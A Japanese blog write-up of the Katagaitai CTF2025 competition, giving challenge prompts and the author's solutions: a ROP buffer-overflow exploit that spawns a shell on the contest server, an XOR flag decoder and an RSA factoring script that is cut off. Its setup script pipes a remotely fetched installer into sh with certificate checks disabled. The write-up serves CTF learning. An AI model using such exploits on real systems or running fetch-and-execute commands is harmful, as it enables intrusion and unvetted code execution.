<!DOCTYPE html>
<html lang="ja"><script src="/starknote/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=starknote/livereload" data-no-instant defer></script><meta charset="utf-8"><meta name="generator" content="Hugo 0.140.1"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark">
<link rel="icon" href="/starknote/favicon.ico" type="image/x-icon"><title>Katagaitai CTF2025&nbsp;&ndash;&nbsp;しゅたるくの備忘録</title><link rel="stylesheet" href="/starknote/css/core.min.964363afdd281b37186e8f4572a119b584b5c489e7df05c552d5060e2b193d16058787359b6405833d43f4fe66a8263f.css" integrity="sha384-lkNjr90oGzcYbo9FcqEZtYS1xInn3wXFUtUGDisZPRYFh4c1m2QFgz1D9P5mqCY/"><meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Katagaitai CTF2025" /><meta name="twitter:image" content="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/srdnlen-ctf-2025/cover.png" /><meta property="og:type" content="article" />
<meta property="og:title" content="Katagaitai CTF2025" />
<meta property="og:site_name" content="しゅたるくの備忘録" /><meta property="og:image" content="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/srdnlen-ctf-2025/cover.png" /><body><section id="header">
    <div class="header wrap"><span class="header left-side"><a class="site home" href="/starknote/"><span class="site name">しゅたるくの備忘録</span></a></span>
        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/starknote/categories/">カテゴリ</a><a class="nav item" href="/starknote/tags/">タグ</a><a class="nav item" href="/starknote/about/">About</a><a class="nav item" href=""></a></nav></div></span></div></section><section id="content">
<div id="top" class="article-container"><section class="article header">
    <h1 class="article title">Katagaitai CTF2025</h1><p class="article date">Jan 25, 2025</p></section><article class="article markdown-body"><p>2025/1/25 15:00(JST) - 2025/1/25 22:00(JST)で開催された Katagaitai CTF2025 に参加した．</p>
<p>個人で参加し，結果は，4014 点で 82 人中 8 位だった．</p>
<p><a href="https://portal.katagaitai-ctf.com/slides"target="_blank" rel="noopener noreferrer">https://portal.katagaitai-ctf.com/slides</a></p>
<p>勉強会資料：</p>
<ul>
<li><a href="https://hackmd.io/@teppi/Sk8pZ3qvJg"target="_blank" rel="noopener noreferrer">https://hackmd.io/@teppi/Sk8pZ3qvJg</a></li>
</ul>
<pre tabindex="0"><code>#!/bin/bash

# 必要なパッケージのインストール
sudo apt update
sudo apt install -y python3 gdb python3-pip python3-venv openjdk-21-jdk

# Ghidraのインストール
echo &#34;[*]install ghidra&#34;
GHIDRA_URL=&#34;https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.2.1_build/ghidra_11.2.1_PUBLIC_20241105.zip&#34;
wget $GHIDRA_URL -O ghidra.zip --no-check-certificate
unzip ghidra.zip -d ~
rm ghidra.zip
echo &#39;export PATH=&#34;$PATH:$HOME/ghidra_11.2.1_PUBLIC&#34;&#39; &gt;&gt; ~/.bashrc

# Python環境の設定
echo &#34;[*] Setup Python virtual environment&#34;
python3 -m venv ~/venv
. ~/venv/bin/activate

# pwntoolsのインストール
echo &#34;[*] install pwntools&#34;
pip3 install pwntools

# ROPgadgetのインストール
echo &#34;[*] install ROPgadget&#34;
pip3 install ROPgadget

# PyCryptodome
pip3 install pycryptodome

# Gefのインストール
echo &#34;[*] install GEF&#34;
wget -qO- https://raw.githubusercontent.com/okupay-teppi/katagaitai-ctf/refs/heads/main/install_gef.sh --no-check-certificate | sh

deactivate

echo &#34;[*] Done!&#34;
</code></pre><ul>
<li><a href="https://github.com/okupay-teppi/20230805_study?tab=readme-ov-file"target="_blank" rel="noopener noreferrer">https://github.com/okupay-teppi/20230805_study?tab=readme-ov-file</a></li>
<li><a href="https://hackmd.io/@teppi/rktkSIWOkx#Beginners-STACK"target="_blank" rel="noopener noreferrer">https://hackmd.io/@teppi/rktkSIWOkx#Beginners-STACK</a></li>
<li><a href="https://docs.google.com/presentation/d/1sBcX0Yuc18ChKxiFxchf2IvHMgiu4KmtfpAxwVQScCU/edit#slide=id.g32e631ce763_0_164"target="_blank" rel="noopener noreferrer">https://docs.google.com/presentation/d/1sBcX0Yuc18ChKxiFxchf2IvHMgiu4KmtfpAxwVQScCU/edit#slide=id.g32e631ce763_0_164</a></li>
<li><a href="https://hackmd.io/@n1ito/HkoLpUyOJg#20250125_katagaitaiCTF-Crypto%E5%85%A5%E9%96%80RSA%E6%9A%97%E5%8F%B7%E5%85%A5%E9%96%80"target="_blank" rel="noopener noreferrer">https://hackmd.io/@n1ito/HkoLpUyOJg#20250125_katagaitaiCTF-Crypto%E5%85%A5%E9%96%80RSA%E6%9A%97%E5%8F%B7%E5%85%A5%E9%96%80</a></li>
</ul>
<h2 id="learning-session">Learning Session</h2>
<h3 id="beginners-stack-1-100-learning-session">Beginners STACK #1 (100 Learning Session)</h3>
<blockquote>
<p>このバイナリには、スタックバッファオーバフローという脆弱性が存在します。<br>
vuln_func関数内のローカル変数secretを、BOFを利用して書き換えてフラグを入手しましょう。<br>
参考資料：https://github.com/okupay-teppi/20230805_study<br>
問題解法：https://hackmd.io/@teppi/rktkSIWOkx<br>
nc pwn.katagaitai-ctf.com 9002</p>
</blockquote>
<h3 id="beginners-stack-2-127-learning-session">Beginners STACK #2 (127 Learning Session)</h3>
<p>実は、先程のバイナリには添付のwin関数が実装されています。<br>
リターンアドレスを書き換えてwin関数にジャンプしましょう。<br>
※バイナリは「Beginners STACK #1」と同じです。<br>
nc pwn.katagaitai-ctf.com 9002</p>
<h3 id="beginners-stack-3-188-learning-session">Beginners STACK #3 (188 Learning Session)</h3>
<p>この問題にはもう一つフラグが隠されています。<br>
vuln_func関数のリターンアドレスを書き換えて、system(&quot;/bin/sh&quot;)を実行させましょう。<br>
※バイナリは「Beginners STACK #1」と同じです。<br>
nc pwn.katagaitai-ctf.com 9002</p>
<h3 id="crypto-ex-1-127-learning-session-crypto">Crypto ex-1 (127 Learning Session crypto)</h3>
<p>p+qの値が追加で与えられているようです<br>
講義資料：https://hackmd.io/@n1ito/HkoLpUyOJg</p>
<h3 id="crypto-ex-2-139-learning-session-crypto">Crypto ex-2 (139 Learning Session crypto)</h3>
<p>pとqが非常に近いと何が問題でしょうか<br>
講義資料：https://hackmd.io/@n1ito/HkoLpUyOJg</p>
<h3 id="where_is_the_main-304-learning-session-rev">where_is_the_main (304 Learning Session Rev)</h3>
<p>main関数が見つかりません！！</p>
<h2 id="pwn">Pwn</h2>
<h3 id="firstpwn-495-easy-8-solves">firstpwn (495 easy [8 Solves])</h3>
<blockquote>
<p>バッファオーバーフローの脆弱性があるバイナリがリモートサーバ上で稼働しています。 処理を奪ってsystem(&quot;/bin/sh\x00&quot;)を実行しましょう。<br>
nc ~<br>
実施したいことはLearning-Sessionと同様です。 関数やガジェットのアドレスの調べ方を確認しましょう。</p>
</blockquote>
<p>以下の情報を取得したい．</p>
<ol>
<li>pop rdi; ret; のアドレス</li>
<li>/bin/sh\x00のアドレス</li>
<li>retのアドレス</li>
<li>system関数のアドレス</li>
</ol>
<h4 id="pltエントリの調べ方">PLTエントリの調べ方</h4>
<p>system関数などの標準ライブラリ関数のPLTエントリはobjdumpコマンドを使用して以下のように求められる．</p>
<pre tabindex="0"><code>$ objdump -d -j.plt chall
...
0000000000401040 &lt;system@plt&gt;:
  401040:	ff 25 da 2f 00 00    	jmp    *0x2fda(%rip)        # 404020 &lt;system@GLIBC_2.2.5&gt;
  401046:	68 01 00 00 00       	push   $0x1
  40104b:	e9 d0 ff ff ff       	jmp    401020 &lt;.plt&gt;

0000000000401050 &lt;printf@plt&gt;:
  401050:	ff 25 d2 2f 00 00    	jmp    *0x2fd2(%rip)        # 404028 &lt;printf@GLIBC_2.2.5&gt;
  401056:	68 02 00 00 00       	push   $0x2
  40105b:	e9 c0 ff ff ff       	jmp    401020 &lt;.plt&gt;
...
</code></pre><p>よって，system関数のアドレスは<code>0x0000000000401040</code>である．</p>
<h4 id="ropガジェットの調べ方">ROPガジェットの調べ方</h4>
<p>pop rdi; ret;ガジェットやret;ガジェットのアドレスはROPgadgetというツールを用いて以下のように求められる．</p>
<pre tabindex="0"><code>$ ROPgadget --binary ~/Downloads/chall --only &#34;pop|rdi|ret&#34;
Gadgets information
============================================================
0x00000000004013bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004013be : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004013c0 : pop r14 ; pop r15 ; ret
0x00000000004013c2 : pop r15 ; ret
0x00000000004013bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004013bf : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040114d : pop rbp ; ret
0x00000000004013c3 : pop rdi ; ret
0x00000000004013c1 : pop rsi ; pop r15 ; ret
0x00000000004013bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
0x0000000000401072 : ret 0x2f
0x00000000004011ea : ret 0x8948

Unique gadgets found: 13
</code></pre><p>よって，pop rdi; ret; のアドレスは<code>0x00000000004013c3</code>であり，retのアドレスは<code>0x000000000040101a</code>である．</p>
<h4 id="binshx00のアドレス">/bin/sh\x00のアドレス</h4>
<p>/bin/sh\x00の文字列のアドレスの探索は，gdbで適当に実行してから，findで見つける．</p>
<pre tabindex="0"><code>$ chmod +x chall
$ gdb -q chall
gef&gt; b main
gef&gt; r
gef&gt; find /bin/sh\\x00
[+] Searching &#39;/bin/sh\x00&#39; in whole memory
[+] In &#39;/home/krimm/Downloads/chall&#39; (0x402000-0x403000 [r--])
  0x000000402008:    2f 62 69 6e 2f 73 68 00  00 5b 2a 5d 20 70 72 69    |  /bin/sh..[*] pri  |
[+] In &#39;/home/krimm/Downloads/chall&#39; (0x403000-0x404000 [r--])
  0x000000403008:    2f 62 69 6e 2f 73 68 00  00 5b 2a 5d 20 70 72 69    |  /bin/sh..[*] pri  |
[+] In &#39;/usr/lib/x86_64-linux-gnu/libc.so.6&#39; (0x7ffff7db0000-0x7ffff7dff000 [r--])
  0x7ffff7dcb42f:    2f 62 69 6e 2f 73 68 00  65 78 69 74 20 30 00 6e    |  /bin/sh.exit 0.n  |
</code></pre><p>よって，/bin/sh\x00の文字列のアドレスは<code>0x000000402008</code>である．</p>
<p>参考：
<a href="https://qiita.com/MachineHunter/items/9b954f7a0aee0a0a3cba"target="_blank" rel="noopener noreferrer">https://qiita.com/MachineHunter/items/9b954f7a0aee0a0a3cba</a></p>
<h4 id="ペイロードの長さ">ペイロードの長さ</h4>
<p>ペイロードの長さは，実行するとスタックを表示してくれているので，<code>0x00007ffe86d538d8 : 0x0000000000401174</code>
の部分がリターンアドレスだとわかる．よって，11*8=88バイトである．</p>
<pre tabindex="0"><code>$ nc ~ 9003
[+] Opening connection to pwn.katagaitai-ctf.com on port 9003: Done
[*] Switching to interactive mode
[*] print stack frame ... 
address            : value            
0x00007ffe86d53880 : 0x0000000000000001
0x00007ffe86d53888 : 0x00007ffe86d539d8
0x00007ffe86d53890 : 0x00007ffe86d539e8
0x00007ffe86d53898 : 0x0000000000401351
0x00007ffe86d538a0 : 0x0000000000000002
0x00007ffe86d538a8 : 0x00000000004013ad
0x00007ffe86d538b0 : 0x00007215bd5d12e8
0x00007ffe86d538b8 : 0x0000000000401360
0x00007ffe86d538c0 : 0x0000000000000000
0x00007ffe86d538c8 : 0xcafebabedeabbeef
0x00007ffe86d538d0 : 0x00007ffe86d538e0
0x00007ffe86d538d8 : 0x0000000000401174
0x00007ffe86d538e0 : 0x0000000000000000
0x00007ffe86d538e8 : 0x00007215bd404083
0x00007ffe86d538f0 : 0x00007215bd5cd6a0
0x00007ffe86d538f8 : 0x00007ffe86d539d8

[*] print registers ... 
 [-] RDI Register: 0x00007ffe86d53880
 [-] RSI Register: 0x00007ffe86d539d8
 [-] RDX Register: 0x00007ffe86d539e8

[*] Done ...
[*] Please input data in &#39;buf1&#39; ...
</code></pre><p>以上より，Solver.pyを以下のようにして作成．



<figure class="xCodeBlock">
<figcaption class="xCodeBlock_title">Solver.py</figcaption>
<div class="xCodeBlock_code"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.katagaitai-ctf.com&#34;</span><span class="p">,</span> <span class="mi">9003</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system_plt</span> <span class="o">=</span> <span class="mh">0x0000000000401040</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x00000000004013c3</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x000000402008</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">88</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_plt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">target</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># print(target.recvall().decode())</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></div>
</figure></p>
<p>実行すると，探索するとflagが得られる．</p>
<pre tabindex="0"><code>$ python3 Solver.py
[+] Opening connection to pwn.katagaitai-ctf.com on port 9003: Done
[*] Switching to interactive mode
[*] print stack frame ... 
address            : value            
0x00007ffcbb5070c0 : 0x0000000000000001
0x00007ffcbb5070c8 : 0x00007ffcbb507218
0x00007ffcbb5070d0 : 0x00007ffcbb507228
0x00007ffcbb5070d8 : 0x0000000000401351
0x00007ffcbb5070e0 : 0x0000000000000002
0x00007ffcbb5070e8 : 0x00000000004013ad
0x00007ffcbb5070f0 : 0x0000783b053b82e8
0x00007ffcbb5070f8 : 0x0000000000401360
0x00007ffcbb507100 : 0x0000000000000000
0x00007ffcbb507108 : 0xcafebabedeabbeef
0x00007ffcbb507110 : 0x00007ffcbb507120
0x00007ffcbb507118 : 0x0000000000401174
0x00007ffcbb507120 : 0x0000000000000000
0x00007ffcbb507128 : 0x0000783b051eb083
0x00007ffcbb507130 : 0x0000783b053b46a0
0x00007ffcbb507138 : 0x00007ffcbb507218

[*] print registers ... 
 [-] RDI Register: 0x00007ffcbb5070c0
 [-] RSI Register: 0x00007ffcbb507218
 [-] RDX Register: 0x00007ffcbb507228

[*] Done ...
[*] Please input data in &#39;buf1&#39; ...
$ ls
Makefile
chall
chall.c
flag
start.sh
$ cat flag
katagaitai-CTF{7h15_15_y0ur_f1r57_9WN!!!}
</code></pre><h3 id="got-overwrite-500-medium-1-solves">GOT Overwrite (500 medium [1 Solves])</h3>
<blockquote>
<p>バッファオーバーフローの脆弱性があるバイナリがリモートサーバ上で稼働しています。<br>
「GOT Overwrite」という攻撃手法について調べてみましょう。<br>
nc pwn.katagaitai-ctf.com 9004</p>
</blockquote>
<h3 id="byor-500-hard-1-solves">BYOR (500 hard [1 Solves])</h3>
<blockquote>
<p>バッファオーバフローの脆弱性があります。攻略しましょう。<br>
nc pwn.katagaitai-ctf.com 9005</p>
</blockquote>
<h2 id="rev">Rev</h2>
<h3 id="operand-451-medium-22-solves">operand (451 medium [22 Solves])</h3>
<blockquote>
<p>ちゃんと動かなそうなプログラムなのに動いてますね。。<br>
xorという関数が怪しいですね。どこが怪しいでしょうか。</p>
</blockquote>
<p>実行ファイルをghidraに投げると，暗号化されたflagとそれにxor関数で処理していることがわかる．</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">sVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">flag</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span> <span class="p">[</span><span class="mi">56</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_20</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">builtin_strncpy</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="s">&#34;&gt;4!424&lt;!4&lt;x</span><span class="se">\x16\x01\x13</span><span class="s">.</span><span class="se">\&#34;</span><span class="s">=f</span><span class="se">\&#39;</span><span class="s">f</span><span class="se">\n</span><span class="s">d`</span><span class="se">\n\&#39;</span><span class="s">1dj(_&#34;</span><span class="p">,</span><span class="mh">0x1f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&#34;flag&gt; &#34;</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">xor</span><span class="p">(</span><span class="s">&#34;00000000000000000000000000000&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">sVar1</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">sVar1</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)(</span><span class="kt">long</span><span class="p">)</span><span class="n">i</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&#34;You have wrong flag..</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="mh">0x17</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">      <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&#34;Congratulations!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="mh">0x13</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_20</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">xor</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">sVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">sVar1</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">sVar1</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)(</span><span class="kt">long</span><span class="p">)</span><span class="n">i</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x55</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>特に，xor関数では，それぞれの文字に<code>0x55</code>とxorを取っているだけなので，以下のように解読する．



<figure class="xCodeBlock">
<figcaption class="xCodeBlock_title">Solver.py</figcaption>
<div class="xCodeBlock_code"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">input_str</span> <span class="o">=</span> <span class="s2">&#34;&gt;4!424&lt;!4&lt;x</span><span class="se">\x16\x01\x13</span><span class="s2">.</span><span class="se">\&#34;</span><span class="s2">=f</span><span class="se">\&#39;</span><span class="s2">f</span><span class="se">\n</span><span class="s2">d`</span><span class="se">\n\&#39;</span><span class="s2">1dj(_&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">input_str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">xor_result</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x55</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">xor_result</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span></span></span></code></pre></div></div>
</figure></p>
<p><code>katagaitai-CTF{wh3r3_15_rd1?}</code></p>
<h3 id="nazonobasho-495-medium-8-solves">nazonobasho (495 medium [8 Solves])</h3>
<blockquote>
<p>赤の〇で表示されたのがあなたです！！<br>
黄色の[]で表示された宝箱を取りに行きましょう！！<br>
※コンソール画面を大きくしないとうまく表示できません。<br>
&ldquo;command&gt; &ldquo;と表示されたとき<br>
&lsquo;a&rsquo;で左に<br>
&rsquo;d&rsquo;で右に<br>
&lsquo;w&rsquo;で上に<br>
&lsquo;x&rsquo;で下に<br>
動きます。<br>
&rsquo;s&rsquo;で現在の座標をセーブできます。<br>
&lsquo;p&rsquo;で全体マップを表示します。(コンソールの文字を小さくする必要があるかもしれません。)<br>
&lsquo;q&rsquo;でゲームを終了します。</p>
</blockquote>
<h2 id="crypto">Crypto</h2>
<h3 id="triple-prime-number-200-easy-53-solves">triple prime number (200 easy [53 Solves])</h3>
<blockquote>
<p>非常に大きな素数p,qを使っているため、この暗号は解読不可能です。<br>
qはpのおおよそ3倍の大きさの素数になっています。</p>
</blockquote>
<p>\sqrt{N}/3 付近を総当たりした．</p>



<figure class="xCodeBlock">
<figcaption class="xCodeBlock_title">Solver.py</figcaption>
<div class="xCodeBlock_code"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">isPrime</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">N</span> <span class="o">=</span> <span class="mi">67065672690003311763317709419239610557390343983642475637401743672576109945257067184833335724739055507713911257315218712587814893083624350883742409846705280437477167123258389279794173962158743669272579645355673342245762921030115425496807817179463838289989203454462239442929037937280576079274015891379372111920942638362069541216440451571876835309164009534472257137288932986602402701138615446175231785642792848820669091022296147160056161442272348780482860974581364602714484270631008573473898498428385421074872452077465881960139871928561910298478867269284810190424497649782935570132183725497729691409916508813245062130717</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">48141562923871083014787967622878906989794337644154518693891607304653086195283748066464626227387560498174312882600915530896311873451719919881013485188886552136171663560506892992061365053564941028961783007281608994591890724343626429488198602396064077068317352966231341078531074244714250131439327527702967234197174610978175451434403144143929967942519339212638940715118885947858572492615370041199900154549327069364947064186401270502244647235839653174778612836848667894682929935646780724078041869331796039547774517905373955566804586398816127667745198939820021666387133349877782922343576819256878925770428220409970820294598</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">next_prime</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">isPrime</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">n</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">N_</span> <span class="o">=</span> <span class="n">N</span> <span class="o">//</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="o">-</span><span class="mi">100</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">q</span> <span class="o">=</span> <span class="n">next_prime</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="o">.</span><span class="n">isqrt</span><span class="p">(</span><span class="n">N_</span><span class="p">))</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">=</span><span class="n">N</span><span class="o">//</span><span class="n">q</span>
